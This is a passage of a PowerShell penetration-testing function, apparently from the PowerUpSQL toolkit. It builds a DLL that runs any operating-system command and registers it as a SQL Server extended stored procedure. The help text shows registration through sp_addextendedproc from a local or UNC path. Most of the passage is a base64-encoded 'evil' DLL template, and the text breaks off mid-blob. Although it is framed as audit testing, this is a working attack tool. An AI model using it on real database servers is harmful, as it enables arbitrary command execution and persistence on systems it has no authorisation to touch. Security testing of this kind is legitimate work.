	    Windows command.  This script is intended to be used to test basic SQL Server audit controls around
	    the sp_addextendedproc and sp_dropextendedproc stored procedures used to register and unregister 
	    extended stored procedures.
    .PARAMETER ExportName
        Name of the exported function that will be created.    
    .PARAMETER Command
        Operating system command that the exported function will run.   
    .PARAMETER OutFile
        Name of the Dll file to write to. 
    .EXAMPLE
        PS C:\temp> Create-SQLFile-XPDLL -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
 
	     Creating DLL c:\temp\test.dll
	     - Exported function name: xp_test
	     - Exported function command: "echo test > c:\temp\test.txt"
	     - DLL written
	     - Manual test: rundll32 c:\temp\test.dll,xp_test
 
	     SQL Server Notes
	     The exported function can be registered as a SQL Server extended stored procedure. Options below:
	     - Register xp via local disk: sp_addextendedproc 'xp_test', 'c:\temp\myxp.dll'
	     - Register xp via UNC path: sp_addextendedproc 'xp_test', '\\servername\pathtofile\myxp.dll'
	     - Unregister xp: sp_dropextendedproc 'xp_test'
    .LINK
        http://en.cppreference.com/w/cpp/utility/program/system
        http://www.netspi.com

    .NOTES
        The extended stored procedure template used to create the DLL shell was based on the following stackoverflow post:
        http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure

        Modified source code used to create the DLL can be found at the link below:
	    https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/xp_evil_template.cpp
	    
	    The method used to patch the DLL was based on Will Schroeder "Invoke-PatchDll" function found in the PowerUp toolkit:
	    https://github.com/HarmJ0y/PowerUp
#>

        [CmdletBinding()]
        Param(

            [Parameter(Mandatory=$false,
            HelpMessage='Operating system command to run.')]
            [string]$Command,

            [Parameter(Mandatory=$false,
            HelpMessage='Name of exported function.')]
            [string]$ExportName,

            [Parameter(Mandatory=$false,
            HelpMessage='Dll file to write to.')]
            [string]$OutFile
        )

        # -----------------------------------------------
        # Define the DLL file and command to be executed
        # -----------------------------------------------

        # This is the base64 encoded evil64.dll -command: base64 -w 0 evil64.dll > evil64.dll.b64
        $DllBytes64 = "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zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVVdIgezIAAAASIvsSIv8uTIAAAC4zMzMzPOruAEAAABIjaXIAAAAX13DzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzEiJVCQQSIlMJAhVV0iB7MgAAABIi+xIi/y5MgAAALjMzMzM86tIi4wk6AAAAEiNpcgAAABfXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMTIlEJBiJVCQQSIlMJAhVV0iB7NgAAABIi+xIi/y5NgAAALjMzMzM86tIi4wk+AAAAIuF+AAAAImFwAAAALgBAAAASI2l2AAAAF9dw8zMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhVV0iB7AgBAABIjWwkIEiL/LlCAAAAuMzMzMzzq0iLjCQoAQAASI0Fb4EAAEiJRQhIi00I/xUZCwEAuAEAAABIjaXoAAAAX13DzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiNBQH7///DzMzMzMzMzMxIjQUL+v//w8zMzMzMzMzMSIPsOIA96ckAAAB1LUG5AQAAAMYF2skAAAFFM8DHRCQgAAAAADPSM8nolPj//0iLyEiDxDjpVfn//0iDxDjDzMzMzMzMzMzMzMzMzMzMzMxIg+w4QbkBAAAAx0QkIAEAAABFM8Az0jPJ6FT4//9Ig8Q4w8zMzMzMzMzMzMzMzMxMiUQkGIlUJBBIiUwkCEiD7DiLRCRIiUQkJIN8JCQAdCiDfCQkAXQQg3wkJAJ0OoN8JCQDdD3rRUiLVCRQSItMJEDoaQAAAOs5SIN8JFAAdAfGRCQgAesFxkQkIAAPtkwkIOjpAQAA6xnoH/j//w+2wOsP6Cn4//8PtsDrBbgBAAAASIPEOMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiJVCQQSIlMJAhIg+xIM8no2vn//w+2wIXAdQczwOkjAQAA6Dv5//+IRCQgxkQkIQGDPeDIAAAAdAq5BwAAAOii+P//xwXKyAAAAQAAAOhv+f//D7bAhcB1Autw6K34//9IjQ2/+P//6EL4///okvj//0iNDZD4///oMfj//+ge9///SI0VBnoAAEiNDe94AADog/f//4XAdALrMOiA+f//D7bAhcB1AusiSI0Vv3cAAEiNDah2AADoQvj//8cFUcgAAAIAAADGRCQhAA+2TCQg6Mb2//8PtkQkIYXAdAQzwOtj6F73//9IiUQkKEiLRCQoSIM4AHQ7SItMJCjo1vb//w+2wIXAdCpIi0QkKEiLAEiJRCQwSItMJDDoWPf//0yLRCRYugIAAABIi0wkUP9UJDCLBY/HAAD/wIkFh8cAALgBAAAASIPESMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMiEwkCEiD7DiDPRnHAAAAfwQzwOtkiwUNxwAA/8iJBQXHAADom/f//4hEJCCDPUXHAAACdAq5BwAAAOgH9///6Iv1///HBSrHAAAAAAAA6NX2//8PtkwkIOif9f//M9IPtkwkQOid9f//D7bAhcB1BDPA6wW4AQAAAEiDxDjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEyJRCQYiVQkEEiJTCQISIPsSMdEJDABAAAAg3wkWAF0B4N8JFgCdUZMi0QkYItUJFhIi0wkUOh1AQAAiUQkMIN8JDAAdQXp8AAAAEyLRCRgi1QkWEiLTCRQ6LL8//+JRCQwg3wkMAB1BenNAAAAg3wkWAF1CkiLTCRQ6NL1//9Mi0QkYItUJFhIi0wkUOhF9///iUQkMIN8JFgBdTqDfCQwAHUzTItEJGAz0kiLTCRQ6CL3//9Mi0QkYDPSSItMJFDoSvz//0yLRCRgM9JIi0wkUOjZAAAAg3wkWAF1B4N8JDAAdAeDfCRYAHUKSItMJFDol/X//4N8JFgAdAeDfCRYA3U3TItEJGCLVCRYSItMJFDo+fv//4lEJDCDfCQwAHUC6xdMi0QkYItUJFhIi0wkUOh5AAAAiUQkMOsIx0QkMAAAAACLRCQwSIPESMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEyJRCQYiVQkEEiJTCQISIPsOEiDPWahAAAAdQe4AQAAAOsoSIsFVqEAAEiJRCQgSItMJCDoT/T//0yLRCRQi1QkSEiLTCRA/1QkIEiDxDjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxMiUQkGIlUJBBIiUwkCEiD7ChMi0QkQItUJDhIi0wkMOjL+v//SIPEKMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMTIlEJBiJVCQQSIlMJAhIg+wog3wkOAF1Bei/8///TItEJECLVCQ4SItMJDDob/3//0iDxCjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIiwXZwwAAw8zMzMzMzMzMSIsF0cMAAMPMzMzMzMzMzIP5BHcPSGPBSI0NYaAAAEiLBMHDM8DDzMzMzMzMzMzMuAUAAADDzMzMzMzMzMzMzEiLBYnDAABIiQ2CwwAASMcFf8MAAAAAAADDzMzMzMzMSIsFccMAAEiJDWrDAABIxwVXwwAAAAAAAMPMzMzMzMyD+QR3FUhjwUyNBdnBAABBiwyAQYkUgIvBw4PI/8PMzMzMzMzMzMzMzMzMzMzMzMxIiUwkCEiD7Cgz0kiLBdbBAAC5QAAAAEj38UiLwkiLDcTBAABIi1QkMEgz0UiLyovQ6IPy//9Ig8Qow8zMzMzMzMzMzMzMzMzMzMzMzMzMzEiJTCQISIPsKDPSSIsFhsEAALlAAAAASPfxSIvCuUAAAABIK8hIi8GL0EiLTCQw6DXy//9IMwVdwQAASIPEKMPMzMzMzMzMzMzMzMzMzMzMiVQkEEiJTCQIi0QkEA+2yEiLRCQISNPIw8zMzMzMzMxIiVQkEEiJTCQISIPsOEiLRCRASIlEJBBIi0QkEEhjQDxIi0wkEEgDyEiLwUiJRCQgSItEJCBIiUQkCEiLRCQID7dAFEiLTCQISI1EARhIiUQkGEiLRCQID7dABkhrwChIi0wkGEgDyEiLwUiJRCQoSItEJBhIiQQk6wxIiwQkSIPAKEiJBCRIi0QkKEg5BCR0LUiLBCSLQAxIOUQkSHIdSIsEJItADEiLDCQDQQiLwEg5RCRIcwZIiwQk6wTrvDPASIPEOMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhIg+woSIN8JDAAdQQywOtwSItEJDBIiQQkSIsEJA+3AD1NWgAAdAQywOtVSIsEJEhjQDxIiwwkSAPISIvBSIlEJBBIi0QkEEiJRCQISItEJAiBOFBFAAB0BDLA6yNIi0QkCEiDwBhIiUQkGEiLRCQYD7cAPQsCAAB0BDLA6wKwAUiDxCjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxlSIsEJTAAAADDzMzMzMzMSIPsSOhm8f//hcB1BDLA60zoXvH//0iLQAhIiUQkKEiLRCQoSIlEJDBIjQ3AwAAAM8BIi1QkMPBID7ERSIlEJCBIg3wkIAB0EkiLRCQgSDlEJCh1BLAB6wTrxDLASIPESMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIg+wo6Obw//+FwHQH6PPu///rBeg18f//sAFIg8Qow8zMzMzMzMzMzMzMzMzMzMxIg+woM8noffD//w+2wIXAdQQywOsCsAFIg8Qow8zMzMzMzMzMzMzMzMzMzMzMzMxIg+wo6CLw//8PtsCFwHUEMsDrF+jp8P//D7bAhcB1CegQ8P//MsDrArABSIPEKMPMzMzMzMzMzMzMzMzMzMzMSIPsKOh17v//6Ofv//+wAUiDxCjDzMzMzMzMzMzMzMxMiUwkIEyJRCQYiVQkEEiJTCQISIPsOOgT8P//hcB1K4N8JEgBdSRIi0QkWEiJRCQgSItMJCDoze7//0yLRCRQM9JIi0wkQP9UJCBIi1QkaItMJGDow+7//0iDxDjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiD7Cjopu///4XAdA5IjQ3kvgAA6GTv///rDuiG7v//hcB1BeiR7v//SIPEKMPMzMzMzMzMzMzMzMzMzMzMzMxIg+woM8nogu///+js7v//SIPEKMPMzMzMzMzMzMzMzIlMJAhIg+wog3wkMAB1B8YFwr4AAAHoSu3//+gg7///D7bAhcB1BDLA6xnoAe///w+2wIXAdQszyeiB7f//MsDrArABSIPEKMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIlMJAhWV0iD7GiDvCSAAAAAAHQUg7wkgAAAAAF0CrkFAAAA6A7u///owu7//4XAdESDvCSAAAAAAHU6SI0N9r0AAOiP7v//hcB0BzLA6aQAAABIjQ33vQAA6Hju//+FwHQHMsDpjQAAALAB6YYAAADpgQAAAEjHwf/////oz+z//0iJRCQgSItEJCBIiUQkKEiLRCQgSIlEJDBIi0QkIEiJRCQ4SI0Fjb0AAEiNTCQoSIv4SIvxuRgAAADzpEiLRCQgSIlEJEBIi0QkIEiJRCRISItEJCBIiUQkUEiNBW69AABIjUwkQEiL+EiL8bkYAAAA86SwAUiDxGhfXsPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIlMJAhIg+xYSItEJGBIiUQkOEiNBVbb/v9IiUQkKEiLTCQo6Ff7//8PtsCFwHUEMsDrUkiLRCQoSItMJDhIK8hIi8FIiUQkQEiLVCRASItMJCjoKPr//0iJRCQwSIN8JDAAdQQywOsdSItEJDCLQCQlAAAAgIXAdAQywOsIsAHrBDLA6wBIg8RYw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMyITCQISIPsKOjy7P//hcB1AusXD7ZEJDCFwHQC6wwzwEiNDVm8AABIhwFIg8Qow8zMzMzMzMzMzMzMzMzMzMzMiFQkEIhMJAhIg+woD7YFNbwAAIXAdA0PtkQkOIXAdASwAesWD7ZMJDDoQez//w+2TCQw6Pfq//+wAUiDxCjDzMzMzMzMzMzMzMzMzMzMzMxIiUwkCEiD7EhIiw2ouwAA6Avr//9IiUQkMEiDfCQw/3UsSItMJFDomOz//4XAdQxIi0QkUEiJRCQg6wlIx0QkIAAAAABIi0QkIOsx6y9Ii1QkUEiNDV67AADo/Ov//4XAdQxIi0QkUEiJRCQo6wlIx0QkKAAAAABIi0QkKEiDxEjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiJTCQISIPsOEiLDRC7AADoW+r//0iJRCQgSIN8JCD/dQ5Ii0wkQOhO6v//6x3rG0iLRCRASIlEJChIi1QkKEiNDdq6AADoYOv//0iDxDjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIiUwkCEiD7DhIi0wkQOix6f//SIXAdArHRCQgAAAAAOsIx0QkIP////+LRCQgSIPEOMPMzMzMzMzMzMzMzMzMSIPsSEjHRCQoAAAAAEi4MqLfLZkrAABIOQXquAAAdBZIiwXhuAAASPfQSIkF37gAAOnXAAAASI1MJCj/FUf5AABIi0QkKEiJRCQg/xU/+QAAi8BIi0wkIEgzyEiLwUiJRCQg/xUv+QAAi8BIi0wkIEgzyEiLwUiJRCQgSI1MJDD/FUr4AACLRCQwSMHgIEgzRCQwSItMJCBIM8hIi8FIiUQkIEiNRCQgSItMJCBIM8hIi8FIiUQkIEi4////////AABIi0wkIEgjyEiLwUiJRCQgSLgyot8tmSsAAEg5RCQgdQ9IuDOi3y2ZKwAASIlEJCBIi0QkIEiJBQq4AABIi0QkIEj30EiJBQO4AABIg8RIw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiD7ChIjQ1FuQAA/xUP+AAASIPEKMPMzMzMzMzMzMzMSIPsKEiNDSW5AADoWef//0iDxCjDzMzMzMzMzMzMzMxIjQUhuQAAw8zMzMzMzMzMSI0FIbkAAMPMzMzMzMzMzEiD7DjoYOj//0iJRCQgSItEJCBIiwBIg8gESItMJCBIiQHo7ef//0iJRCQoSItEJChIiwBIg8gCSItMJChIiQFIg8Q4w8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiNBWG/AADDzMzMzMzMzMyJTCQIxwWmuAAAAAAAAMPMzMzMzMzMzMzMzMzMzMzMzIlMJAhXSIHs8AUAALkXAAAA6F/n//+FwHQLi4QkAAYAAIvIzSm5AwAAAOh+5v//SI2EJCABAABIi/gzwLnQBAAA86pIjYwkIAEAAP8V1/YAAEiLhCQYAgAASIlEJFBFM8BIjVQkWEiLTCRQ/xWv9gAASIlEJEhIg3wkSAB0QUjHRCQ4AAAAAEiNRCRwSIlEJDBIjUQkeEiJRCQoSI2EJCABAABIiUQkIEyLTCRITItEJFBIi1QkWDPJ/xVZ9gAASIuEJPgFAABIiYQkGAIAAEiNhCT4BQAASIPACEiJhCS4AQAASI2EJIAAAABIi/gzwLmYAAAA86rHhCSAAAAAFQAAQMeEJIQAAAABAAAASIuEJPgFAABIiYQkkAAAAP8V7fUAAIP4AXUHxkQkQAHrBcZEJEAAD7ZEJECIRCRBSI2EJIAAAABIiUQkYEiNhCQgAQAASIlEJGgzyf8VofUAAEiNTCRg/xWe9QAAiUQkRIN8JEQAdRMPtkQkQYXAdQq5AwAAAOgl5f//SIHE8AUAAF/DzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFdIgeygAAAASI1EJDBIi/gzwLloAAAA86pIjUwkMP8V0/QAAItEJGyD4AGFwHQLD7dEJHCJRCQg6wjHRCQgCgAAAA+3RCQgSIHEoAAAAF/DzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzDPAw8zMzMzMzMzMzMzMzMxIg+w4M8n/FVz0AABIiUQkIEiDfCQgAHUHMsDpgQAAAEiLRCQgD7cAPU1aAAB0BDLA625Ii0QkIEhjQDxIi0wkIEgDyEiLwUiJRCQoSItEJCiBOFBFAAB0BDLA60RIi0QkKA+3QBg9CwIAAHQEMsDrMEiLRCQog7iEAAAADncEMsDrHrgIAAAASGvADkiLTCQog7wBiAAAAAB1BDLA6wKwAUiDxDjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMSIPsKEiNDU3j////FZ/zAABIg8Qow8zMzMzMzMzMzMxIiUwkCEiD7DhIi0QkQEiLAEiJRCQgSItEJCCBOGNzbeB1SEiLRCQgg3gYBHU9SItEJCCBeCAgBZMZdCpIi0QkIIF4ICEFkxl0HEiLRCQggXggIgWTGXQOSItEJCCBeCAAQJkBdQXoYeX//zPASIPEOMPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIiVwkEFZIg+wgSI0d354AAEiNNfCgAABIO95zJUiJfCQwSIs7SIX/dApIi8/oZuP////XSIPDCEg73nLlSIt8JDBIi1wkOEiDxCBew8zMzMzMzMzMzMzMzMzMzMzMzMxIiVwkEFZIg+wgSI0dr6EAAEiNNcCjAABIO95zJUiJfCQwSIs7SIX/dApIi8/oBuP////XSIPDCEg73nLlSIt8JDBIi1wkOEiDxCBew8zMzMzMzMzMzMzMzMzMzMzMzMxIiUwkCEiD7ChIi0wkMP8VrBEBAEiDxCjDzMzMzMzMzMIAAMzMzMzMzMzMzMzMzMxIg+xYxkQkYADHRCQgARAAAIlMJChIjUQkYEiJRCQwTI1MJCAz0kSNQgq5iBNtQP8Vu/EAAOsAD7ZEJGBIg8RYw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIg+xYxkQkYADHRCQgAhAAAIlMJCiJVCQsTIlEJDBIjUQkYEiJRCQ4TIlMJEBMjUwkIDPSRI1CCrmIE21A/xVN8QAA6wAPtkQkYEiDxFjDzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMQFVWQVZIgezgAQAASIsF5bAAAEgzxEiJhCTAAQAAizW0sAAASIvqTIvxg/7/D4Q5AQAASIXSdRdEjUIEi9ZMjQ0rlQAA6JYEAADpHQEAAEiLQgxIjQ1ulQAASIlMJFBMjQ3KlQAARIlEJEhIjQ1mlQAASIlMJEBMjQUKlgAASIPoJEiJnCTYAQAASIlEJDhIjVogSI0FdpUAAEiJvCTQAQAASIlEJDBIjYwksAAAAEiNBWqVAABIiVwkKL8GAQAASIlEJCCL1+hO4P//TItNDEiNVCR4SYPpJEiNTCRgTIvD6PoCAABIjYwksAAAAOjNAwAASI2MJLAAAABIK/jovQMAAEiNjCSwAAAASIvXSAPITI1MJGBIjQWDlQAASIlEJDBMjQV/lQAASI1EJHhIiUQkKEiNBWqVAABIiUQkIOjW3///TI2MJLAAAABBuAQAAACL1kmLzuiEAwAASIu8JNABAABIi5wk2AEAAEiLjCTAAQAASDPM6Jfh//9IgcTgAQAAQV5eXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzIP6BHcrSGPCTI0Nwc7+/0WLlIEI4AEATYuMwSi/AQBBg/r/dChEi8JBi9LpwAIAAEyLDemNAAC6BQAAAEG6AQAAAESLwkGL0umjAgAAw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxIiVwkGEiJdCQgV0iB7DAEAABIiwV/rgAASDPESImEJCAEAACLPUauAABIi9pIi/GD//8PhNAAAACAOgAPhLAAAABIi8roFgIAAEiDwC1IPQAEAAAPh5gAAABMjUwkIDPJSI0VaI0AAA8fhAAAAAAAD7YEEYhEDCBIjUkBhMB18EiNTCQgSP/JDx+EAAAAAACAeQEASI1JAXX2M9IPH0AAD7YEE4gEEUiNUgGEwHXxSI1MJCBI/8lmDx+EAAAAAACAeQEASI1JAXX2TI0FH40AADPSDx9AAGYPH4QAAAAAAEEPtgQQiAQRSI1SAYTAdfDrB0yNDd+RAABBuAIAAACL10iLzuh3AQAASIuMJCAEAABIM8zomt///0yNnCQwBAAASYtbIEmLcyhJi+Nfw8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMxAVUFUQVVBVkFXSIPsIEUz9r0QAAAATDvNTYv4TIviTIvpSQ9C6UiF7XRkSIlcJFBMK/lIiXQkWEGL9kiJfCRgTIv1SIv5ZmYPH4QAAAAAAEEPthw/So0MJroxAAAATI0FI5EAAESLy0gr1ujK3P//SIPGA4gfSI1/AUiD7QF10EiLfCRgSIt0JFhIi1wkUEuNBHRDxgQuAEHGBAYASIPEIEFfQV5BXUFcXcPMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzEiLwQ+2EEj/wITSdfZIK8FI/8jDzMzMzMzMzMzMzMzMQFNVV0FUQVVBVkFXSIHssA4AAEiLBf6rAABIM8RIiYQkkA4AAEUz7Ulj6EWL9U2L+USL4kiL+egD3P//SIvYSIXAdQtIi8/oqNv//0yL8ESJbCQoQYPJ/02Lx0yJbCQgM9JIibQkqA4AALnp/QAA/xXD6wAASGPISIH5AAIAAHMxiUQkKEGDyf9IjYQkkAoAAE2LxzPSSIlEJCC56f0AAP8VkusAAEiNtCSQCgAAhcB1B0iNNWeOAAC5AhAAAOiN+f//hcB0IUiNDWqKAABMi86LFKlMi8eLzejS+f//hcAPhVsBAADrArABTYX2dQlIhdsPhEgBAACEwHQO/xVu6wAAhcAPhTYBAABIjYQkYAIAAMdEJCgEAQAASI1P+0iJRCQgTI1MJEBBuAQBAABIjVQkUOj82///SIXbdDlIi8vos9v//0SLRCRASI0FX44AAEiJdCQwTI2MJGACAACJbCQoSI1UJFBBi8xIiUQkIP/T6cUAAABMiWwkOEiNhCRwBAAATIlsJDBMjUQkUMdEJCgKAwAASI0dZI4AAEGDyf9IiUQkIDPSuen9AAD/FX7qAABMiWwkOEiNvCRwBAAAhcBMiWwkMEiNhCSABwAAx0QkKAoDAABID0T7SIlEJCBBg8n/TI2EJGACAAAz0kiNNSSOAAC56f0AAP8VMeoAAEiNnCSABwAASYvOhcBID0Te6OPa//9Ei0QkQEiNBQ+OAABMiXwkMEyLy4lsJChIi9dBi8xIiUQkIEH/1oP4AXUBzEiLtCSoDgAASIuMJJAOAABIM8zo2tv//0iBxLAOAABBX0FeQV1BXF9dW8PMzMzMzMzMzMzMzMzMzMzM